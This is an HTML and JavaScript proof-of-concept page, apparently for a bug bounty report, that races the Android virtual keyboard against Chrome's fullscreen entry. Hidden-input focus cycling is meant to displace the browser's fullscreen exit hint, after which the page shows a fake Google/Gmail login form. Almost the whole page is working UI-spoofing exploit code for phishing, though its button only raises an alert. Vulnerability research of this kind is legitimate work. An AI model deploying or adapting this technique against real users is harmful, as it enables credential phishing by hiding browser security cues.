<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>PoC v3b - IME Keyboard Race</title>
    <style>
        body, html { margin: 0; padding: 0; overflow: hidden; background: #202124; font-family: 'Segoe UI', sans-serif; }
        #payload { display: none; color: white; text-align: center; padding-top: 10vh; }
        .warning-header { color: #ff4444; font-size: 1.2rem; margin-bottom: 20px; border-bottom: 1px solid #444; padding-bottom: 10px; }
        .login-box { background: white; color: #202124; width: 85vw; max-width: 380px; margin: 0 auto; padding: 32px; border-radius: 8px; box-shadow: 0 4px 15px rgba(0,0,0,0.5); }
        input { width: 100%; padding: 10px; margin: 10px 0; border: 1px solid #dadce0; border-radius: 4px; box-sizing: border-box; font-size: 16px; }
        button.login-btn { background: #1a73e8; color: white; border: none; padding: 10px 24px; border-radius: 4px; cursor: pointer; width: 100%; font-weight: bold; font-size: 16px; }
        #initial-ui { position: relative; z-index: 100; text-align: center; color: #0f0; padding: 40px; padding-top: 15vh; }
        .attack-btn { padding: 30px 40px; font-size: 22px; cursor: pointer; background: #111; color: #0f0; border: 5px double #0f0; border-radius: 8px; margin-top: 30px; }
        #log { position: fixed; bottom: 60px; left: 8px; color: #0f0; font-size: 11px; font-family: monospace; z-index: 9999; background: rgba(0,0,0,0.8); padding: 8px 10px; border-radius: 4px; display: none; max-width: 92vw; line-height: 1.6; }
        .variant-tag { position: fixed; top: 10px; right: 10px; background: #e91e63; color: white; padding: 4px 10px; border-radius: 4px; font-size: 12px; font-family: monospace; z-index: 9999; }
        /* Hidden input untuk trigger IME tanpa terlihat user */
        #ime-trigger { position: fixed; top: -999px; left: -999px; opacity: 0; width: 1px; height: 1px; font-size: 16px; }
    </style>
</head>
<body>
    <div class="variant-tag">v3b: IME Race</div>
    <input id="ime-trigger" type="text" autocomplete="off" inputmode="text">

    <div id="initial-ui">
        <h2 style="color:#aaa;font-size:13px;margin-bottom:4px;">VECTOR B — ISOLATED TEST</h2>
        <h1 style="font-size:22px;">IME / Virtual Keyboard Race</h1>
        <p style="color:#aaa;font-size:13px;">
            Trigger virtual keyboard tepat saat fullscreen enter.<br>
            <b style="color:#ff0;">Target:</b> IME appearance → WindowInsets change → displace hint overlay<br>
            <b style="color:#ff0;">Timing:</b> focus() fired dalam fullscreenchange event handler
        </p>
        <button id="go" class="attack-btn">LAUNCH v3b</button>
    </div>

    <div id="payload">
        <div class="warning-header">** (Bug Bounty) v3b: IME Race **</div>
        <div class="login-box">
            <img src="https://www.google.com/images/branding/googlelogo/2x/googlelogo_color_92x30dp.png" width="92" alt="Google">
            <h3 style="margin:16px 0 4px;">POC</h3>
            <p style="margin:0 0 16px;color:#555;">Gmail</p>
            <input id="email-input" type="text" placeholder="Email" autocomplete="off">
            <input type="password" placeholder="Password">
            <button class="login-btn" onclick="alert('v3b PoC Success')">Next</button>
        </div>
    </div>

    <div id="log"></div>

    <script>
        const btn = document.getElementById('go');
        const initialUI = document.getElementById('initial-ui');
        const payload = document.getElementById('payload');
        const log = document.getElementById('log');
        const imeTrigger = document.getElementById('ime-trigger');
        const emailInput = document.getElementById('email-input');

        function addLog(msg) {
            log.style.display = 'block';
            log.innerHTML += `[${performance.now().toFixed(0)}ms] ${msg}<br>`;
        }

        btn.onclick = () => {
            const t0 = performance.now();
            initialUI.style.display = 'none';
            payload.style.display = 'block';
            addLog('Click registered');

            // Step 1: requestFullscreen
            addLog('Requesting fullscreen...');
            document.documentElement.requestFullscreen().then(() => {
                addLog(`FS resolved: ${(performance.now()-t0).toFixed(2)}ms`);
            }).catch(e => addLog('FS error: ' + e));

            // Step 2: Register fullscreenchange — ini adalah timing paling kritis
            // fullscreenchange fires SEBELUM hint dirender oleh InfoBarContainer
            // Kita inject IME di titik ini untuk displace hint window
            document.addEventListener('fullscreenchange', () => {
                if (!document.fullscreenElement) return;
                const fsTime = performance.now() - t0;
                addLog(`fullscreenchange: ${fsTime.toFixed(2)}ms — triggering IME`);

                // ATTACK: Force IME appearance segera setelah fullscreen transition
                // Android IME adjusts WindowInsets → SnackbarManager recalculates
                // bottom anchor → hint either displaced or dismissed

                // Attempt 1: immediate focus pada hidden input
                imeTrigger.focus();
                addLog(`IME focus #1: ${(performance.now()-t0).toFixed(2)}ms`);

                // Attempt 2: rapid focus cycling untuk maximize window resize events
                // Setiap focus/blur = WindowInsets change = layout invalidation
                let cycleCount = 0;
                const cycle = () => {
                    if (cycleCount >= 8) {
                        // Final: focus ke email input yang visible
                        // Ini juga convenient untuk UX attack (cursor langsung di field)
                        emailInput.focus();
                        addLog(`IME final focus (email): ${(performance.now()-t0).toFixed(2)}ms`);
                        return;
                    }
                    if (cycleCount % 2 === 0) {
                        imeTrigger.focus();
                    } else {
                        imeTrigger.blur();
                    }
                    cycleCount++;
                    // Gunakan requestAnimationFrame agar setiap cycle = 1 frame
                    // Ini memastikan WindowInsets change diprocess per-frame
                    requestAnimationFrame(cycle);
                };
                requestAnimationFrame(cycle);

            }, { once: true });

            // Step 3: Backup — juga trigger IME setelah FS resolved via promise
            // Double-coverage untuk device dengan delayed fullscreenchange
            document.documentElement.requestFullscreen = 
                document.documentElement.requestFullscreen; // no-op, sudah dipanggil

            // Log visualViewport resize sebagai indicator IME muncul
            if (window.visualViewport) {
                window.visualViewport.addEventListener('resize', () => {
                    addLog(`visualViewport resize: ${window.visualViewport.height.toFixed(0)}px height`);
                });
            }
        };
    </script>
</body>
</html>
